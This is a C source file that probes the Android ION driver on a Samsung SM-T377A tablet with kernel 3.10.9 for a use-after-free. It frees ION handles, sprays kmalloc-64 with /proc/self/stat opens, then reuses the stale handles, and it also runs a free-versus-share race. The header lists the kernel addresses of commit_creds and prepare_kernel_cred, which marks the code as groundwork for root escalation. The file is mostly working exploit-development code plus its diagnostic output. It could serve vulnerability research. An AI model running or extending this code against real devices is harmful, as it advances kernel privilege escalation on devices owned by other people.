/*
 * ion_seq_spray.c — ION handle UAF + seq_operations spray test
 *
 * Samsung SM-T377A, kernel 3.10.9-11788437, Android 6.0.1
 * commit_creds=0xc0054328, prepare_kernel_cred=0xc00548e0
 *
 * HYPOTHESIS:
 * Opening /proc/self/stat allocates seq_operations (4 function ptrs,
 * 16 bytes on ARM32) from kmalloc-64.  ion_handle (~52 bytes) also
 * lives in kmalloc-64.  If we free the handle then immediately spray
 * seq_operations, the spray object can land in the freed slot.
 * Subsequent ION operations (SHARE/MAP) on the stale handle ID would
 * dereference seq_operations data as an ion_handle struct.
 *
 * PRIOR FINDING (from profile): "seq_operations is static .rodata,
 * NOT heap-allocated."  This test verifies empirically.
 *
 * TEST PLAN:
 *  1. Measure kmalloc-64 delta from /proc/self/stat opens
 *  2. FREE handle → spray → ION_IOC_SHARE on stale ID
 *  3. FREE handle → spray → ION_IOC_MAP   on stale ID
 *  4. FREE middle handles → spray → close(ion_fd) (rbtree walk)
 *  5. Tight race: concurrent FREE + spray + SHARE
 *
 * Each dangerous test runs in a forked child with alarm(5) timeout.
 * CPU-pinned to core 0 for SLUB locality.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/types.h>

/* ---- ION definitions ---- */
typedef int ion_user_handle_t;

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    ion_user_handle_t handle;
};

struct ion_fd_data {
    ion_user_handle_t handle;
    int fd;
};

struct ion_handle_data {
    ion_user_handle_t handle;
};

#define ION_IOC_MAGIC  'I'
#define ION_IOC_ALLOC  _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_MAP    _IOWR(ION_IOC_MAGIC, 2, struct ion_fd_data)
#define ION_IOC_SHARE  _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

#define ION_HEAP_SYSTEM  (1 << 0)
#define SEQ_SPRAY_COUNT  100
#define ALLOC_SIZE       4096

/* ---- Helpers ---- */

static void pin_cpu0(void) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

static void alarm_handler(int sig) {
    (void)sig;
    _exit(99);
}

/* Read active_objs for a given slab name from /proc/slabinfo */
static int read_slab_active(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    int active = -1;
    size_t nlen = strlen(name);
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, name, nlen) == 0 &&
            (line[nlen] == ' ' || line[nlen] == '\t')) {
            char sname[64];
            sscanf(line, "%63s %d", sname, &active);
            break;
        }
    }
    fclose(f);
    return active;
}

/* Allocate an ION handle, return 0 on success */
static int ion_alloc(int fd, ion_user_handle_t *out) {
    struct ion_allocation_data a = {
        .len = ALLOC_SIZE, .align = ALLOC_SIZE,
        .heap_id_mask = ION_HEAP_SYSTEM, .flags = 0
    };
    if (ioctl(fd, ION_IOC_ALLOC, &a) < 0) return -1;
    *out = a.handle;
    return 0;
}

/* ================================================================
 * TEST 1 — kmalloc-64 slab delta from opening /proc/self/stat
 * Tells us whether seq_operations or seq_file lands in kmalloc-64.
 * ================================================================ */
static void test_slab_delta(void) {
    printf("\n===== TEST 1: kmalloc-64 delta from /proc/self/stat opens =====\n");

    int before = read_slab_active("kmalloc-64");
    printf("[*] kmalloc-64 active_objs before: %d\n", before);

    int fds[SEQ_SPRAY_COUNT];
    int opened = 0;
    for (int i = 0; i < SEQ_SPRAY_COUNT; i++) {
        fds[i] = open("/proc/self/stat", O_RDONLY);
        if (fds[i] >= 0) opened++;
    }

    int after = read_slab_active("kmalloc-64");
    int delta = after - before;
    printf("[*] kmalloc-64 active_objs after %d opens: %d\n", opened, after);
    printf("[*] Delta: %+d objects\n", delta);

    if (delta >= opened / 2)
        printf("[+] CONFIRMED: /proc/self/stat allocates in kmalloc-64 "
               "(%.1f per open)\n", (double)delta / opened);
    else if (delta > 0)
        printf("[~] Partial: %d kmalloc-64 allocs for %d opens\n",
               delta, opened);
    else
        printf("[-] NO kmalloc-64 growth — seq_operations likely .rodata, "
               "seq_file in another cache\n");

    /* Also check other possibly-relevant caches */
    int k128 = read_slab_active("kmalloc-128");
    for (int i = 0; i < SEQ_SPRAY_COUNT; i++)
        if (fds[i] >= 0) close(fds[i]);

    int k128_after = read_slab_active("kmalloc-128");
    int k64_after  = read_slab_active("kmalloc-64");
    printf("[*] kmalloc-128 delta during opens: %+d\n", k128_after - k128);
    printf("[*] kmalloc-64  after close: %d (freed %+d from peak)\n",
           k64_after, k64_after - after);
}

/* ================================================================
 * TEST 2 — ION_IOC_FREE → seq spray → ION_IOC_SHARE on freed handle
 * ================================================================ */
static void test_share_after_spray(void) {
    printf("\n===== TEST 2: FREE → seq spray → SHARE on stale handle =====\n");

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return; }

    if (pid == 0) {
        alarm(5);
        signal(SIGALRM, alarm_handler);
        pin_cpu0();

        int ion_fd = open("/dev/ion", O_RDWR);
        if (ion_fd < 0) { perror("open /dev/ion"); _exit(1); }

        ion_user_handle_t handle;
        if (ion_alloc(ion_fd, &handle) < 0) {
            perror("ION_IOC_ALLOC"); _exit(1);
        }
        printf("[*] Allocated handle: %d\n", handle);

        /* Free the handle */
        struct ion_handle_data hd = { .handle = handle };
        int fret = ioctl(ion_fd, ION_IOC_FREE, &hd);
        printf("[*] ION_IOC_FREE: ret=%d errno=%d\n", fret, fret < 0 ? errno : 0);

        /* Immediately spray /proc/self/stat into kmalloc-64 */
        int spray_fds[SEQ_SPRAY_COUNT];
        int sprayed = 0;
        for (int i = 0; i < SEQ_SPRAY_COUNT; i++) {
            spray_fds[i] = open("/proc/self/stat", O_RDONLY);
            if (spray_fds[i] >= 0) sprayed++;
        }
        printf("[*] Sprayed %d /proc/self/stat fds\n", sprayed);

        /* Try SHARE with the freed handle ID */
        printf("[*] Attempting ION_IOC_SHARE on freed handle %d...\n", handle);
        struct ion_fd_data share = { .handle = handle, .fd = -1 };
        int ret = ioctl(ion_fd, ION_IOC_SHARE, &share);
        printf("[*] ION_IOC_SHARE: ret=%d fd=%d errno=%d (%s)\n",
               ret, share.fd, errno, ret < 0 ? strerror(errno) : "OK");

        if (ret == 0 && share.fd >= 0) {
            printf("[!] SHARE SUCCEEDED on freed handle — UAF dereference!\n");
            void *ptr = mmap(NULL, ALLOC_SIZE, PROT_READ | PROT_WRITE,
                             MAP_SHARED, share.fd, 0);
            if (ptr != MAP_FAILED) {
                unsigned int *u = (unsigned int *)ptr;
                printf("[!] mmap OK at %p: %08x %08x %08x %08x\n",
                       ptr, u[0], u[1], u[2], u[3]);
                munmap(ptr, ALLOC_SIZE);
            }
            close(share.fd);
        }

        for (int i = 0; i < SEQ_SPRAY_COUNT; i++)
            if (spray_fds[i] >= 0) close(spray_fds[i]);
        close(ion_fd);
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status)) {
        int c = WEXITSTATUS(status);
        if (c == 99) printf("[!] Child timed out (alarm)\n");
        else printf("[+] Test 2 exited %d\n", c);
    } else if (WIFSIGNALED(status)) {
        printf("[!] CRASH signal %d (%s)\n",
               WTERMSIG(status), strsignal(WTERMSIG(status)));
    }
}

/* ================================================================
 * TEST 3 — ION_IOC_FREE → seq spray → ION_IOC_MAP on freed handle
 * ================================================================ */
static void test_map_after_spray(void) {
    printf("\n===== TEST 3: FREE → seq spray → MAP on stale handle =====\n");

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return; }

    if (pid == 0) {
        alarm(5);
        signal(SIGALRM, alarm_handler);
        pin_cpu0();

        int ion_fd = open("/dev/ion", O_RDWR);
        if (ion_fd < 0) _exit(1);

        ion_user_handle_t handle;
        if (ion_alloc(ion_fd, &handle) < 0) _exit(1);
        printf("[*] Allocated handle: %d\n", handle);

        struct ion_handle_data hd = { .handle = handle };
        ioctl(ion_fd, ION_IOC_FREE, &hd);
        printf("[*] Handle freed\n");

        int spray_fds[SEQ_SPRAY_COUNT];
        for (int i = 0; i < SEQ_SPRAY_COUNT; i++)
            spray_fds[i] = open("/proc/self/stat", O_RDONLY);
        printf("[*] Sprayed %d fds\n", SEQ_SPRAY_COUNT);

        printf("[*] Attempting ION_IOC_MAP on freed handle %d...\n", handle);
        struct ion_fd_data md = { .handle = handle, .fd = -1 };
        int ret = ioctl(ion_fd, ION_IOC_MAP, &md);
        printf("[*] ION_IOC_MAP: ret=%d fd=%d errno=%d (%s)\n",
               ret, md.fd, errno, ret < 0 ? strerror(errno) : "OK");

        if (ret == 0 && md.fd >= 0) {
            printf("[!] MAP SUCCEEDED on freed handle!\n");
            close(md.fd);
        }

        for (int i = 0; i < SEQ_SPRAY_COUNT; i++)
            if (spray_fds[i] >= 0) close(spray_fds[i]);
        close(ion_fd);
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status)) {
        int c = WEXITSTATUS(status);
        if (c == 99) printf("[!] Child timed out\n");
        else printf("[+] Test 3 exited %d\n", c);
    } else if (WIFSIGNALED(status)) {
        printf("[!] CRASH signal %d (%s)\n",
               WTERMSIG(status), strsignal(WTERMSIG(status)));
    }
}

/* ================================================================
 * TEST 4 — FREE middle handles → spray → close(ion_fd)
 * Closing the ION client walks the handle rbtree. If freed slots
 * were overwritten, the rb_node pointers may be corrupted.
 * ================================================================ */
static void test_client_close_after_spray(void) {
    printf("\n===== TEST 4: FREE handles → spray → close(ion_fd) =====\n");
    printf("[*] Tests rbtree walk over potentially corrupted entries\n");

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return; }

    if (pid == 0) {
        alarm(5);
        signal(SIGALRM, alarm_handler);
        pin_cpu0();

        int ion_fd = open("/dev/ion", O_RDWR);
        if (ion_fd < 0) _exit(1);

        /* Allocate 5 handles so the rbtree has multiple nodes */
        ion_user_handle_t handles[5];
        for (int i = 0; i < 5; i++) {
            if (ion_alloc(ion_fd, &handles[i]) < 0) {
                printf("[!] Alloc %d failed: %s\n", i, strerror(errno));
                _exit(1);
            }
        }
        printf("[*] Allocated handles: %d %d %d %d %d\n",
               handles[0], handles[1], handles[2], handles[3], handles[4]);

        /* Free the middle three to create rbtree gaps */
        for (int i = 1; i <= 3; i++) {
            struct ion_handle_data hd = { .handle = handles[i] };
            ioctl(ion_fd, ION_IOC_FREE, &hd);
        }
        printf("[*] Freed handles[1..3], spraying...\n");

        /* Spray into the freed kmalloc-64 slots */
        int spray_fds[SEQ_SPRAY_COUNT];
        for (int i = 0; i < SEQ_SPRAY_COUNT; i++)
            spray_fds[i] = open("/proc/self/stat", O_RDONLY);
        printf("[*] Sprayed %d fds\n", SEQ_SPRAY_COUNT);

        /* Close the ION client — ion_client_destroy() walks handles rbtree,
         * freeing remaining handles[0] and handles[4].  The freed-and-
         * possibly-overwritten slots for handles[1..3] should NOT be in
         * the tree (ION_IOC_FREE removes them from the rbtree before
         * kfree).  So this SHOULD be safe. */
        printf("[*] Closing ION client (rbtree cleanup)...\n");
        close(ion_fd);
        printf("[*] ION client closed without crash\n");

        for (int i = 0; i < SEQ_SPRAY_COUNT; i++)
            if (spray_fds[i] >= 0) close(spray_fds[i]);
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status)) {
        int c = WEXITSTATUS(status);
        if (c == 99) printf("[!] Child timed out\n");
        else if (c == 0) printf("[+] Test 4 OK — rbtree walk survived\n");
        else printf("[*] Test 4 exited %d\n", c);
    } else if (WIFSIGNALED(status)) {
        printf("[!] CRASH during rbtree walk! Signal %d (%s)\n",
               WTERMSIG(status), strsignal(WTERMSIG(status)));
        printf("[!] Corrupted rbtree nodes caused kernel oops!\n");
    }
}

/* ================================================================
 * TEST 5 — Tight race: concurrent FREE + spray + SHARE
 * Thread A frees the handle while main thread sprays AND tries
 * SHARE, hoping to hit the narrow window where the handle is
 * half-freed but still findable in the lookup structure.
 * ================================================================ */

struct race_ctx {
    int ion_fd;
    ion_user_handle_t handle;
    volatile int freed;
};

static void *race_free_thread(void *arg) {
    struct race_ctx *ctx = arg;
    struct ion_handle_data hd = { .handle = ctx->handle };
    ioctl(ctx->ion_fd, ION_IOC_FREE, &hd);
    ctx->freed = 1;
    return NULL;
}

static void test_race_spray_share(void) {
    printf("\n===== TEST 5: Race FREE + spray + SHARE (20 rounds) =====\n");

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return; }

    if (pid == 0) {
        alarm(5);
        signal(SIGALRM, alarm_handler);
        pin_cpu0();

        int wins = 0, errors = 0;
        const int rounds = 20;

        for (int r = 0; r < rounds; r++) {
            int ion_fd = open("/dev/ion", O_RDWR);
            if (ion_fd < 0) continue;

            ion_user_handle_t handle;
            if (ion_alloc(ion_fd, &handle) < 0) {
                close(ion_fd); continue;
            }

            /* Launch free thread */
            struct race_ctx ctx = {
                .ion_fd = ion_fd, .handle = handle, .freed = 0
            };
            pthread_t t;
            pthread_create(&t, NULL, race_free_thread, &ctx);

            /* While free may be in-flight, spray + try SHARE */
            int spray_fds[50];
            for (int i = 0; i < 50; i++)
                spray_fds[i] = open("/proc/self/stat", O_RDONLY);

            struct ion_fd_data share = { .handle = handle, .fd = -1 };
            int ret = ioctl(ion_fd, ION_IOC_SHARE, &share);

            pthread_join(t, NULL);

            if (ret == 0 && share.fd >= 0) {
                wins++;
                printf("[!] Round %2d: SHARE succeeded fd=%d "
                       "(freed=%d)\n", r, share.fd, ctx.freed);
                close(share.fd);
            } else {
                errors++;
            }

            for (int i = 0; i < 50; i++)
                if (spray_fds[i] >= 0) close(spray_fds[i]);
            close(ion_fd);
        }

        printf("[*] Race results: %d/%d SHARE wins, %d errors\n",
               wins, rounds, errors);
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status)) {
        int c = WEXITSTATUS(status);
        if (c == 99) printf("[!] Child timed out\n");
        else printf("[+] Test 5 exited %d\n", c);
    } else if (WIFSIGNALED(status)) {
        printf("[!] CRASH in race! Signal %d (%s)\n",
               WTERMSIG(status), strsignal(WTERMSIG(status)));
    }
}

/* ================================================================
 * MAIN
 * ================================================================ */
int main(void) {
    printf("============================================\n");
    printf(" ion_seq_spray — ION UAF + seq_ops spray   \n");
    printf(" Samsung SM-T377A, kernel 3.10.9            \n");
    printf("============================================\n");
    printf("[*] PID: %d  UID: %d\n", getpid(), getuid());

    pin_cpu0();

    test_slab_delta();
    test_share_after_spray();
    test_map_after_spray();
    test_client_close_after_spray();
    test_race_spray_share();

    printf("\n============================================\n");
    printf(" Analysis Guide\n");
    printf("============================================\n");
    printf("[*] kmalloc-64 delta ~0  → seq_operations is .rodata (not heap)\n");
    printf("[*] SHARE/MAP EINVAL     → kernel validates handle via rbtree/idr\n");
    printf("[*] SHARE/MAP succeeded  → stale handle found — UAF dereference!\n");
    printf("[*] Child crashed        → corrupted data was dereferenced\n");
    printf("[*] rbtree walk OK       → ION_IOC_FREE removes node before kfree\n");
    printf("[*] Check: dmesg | tail -30   for kernel oops\n");

    return 0;
}
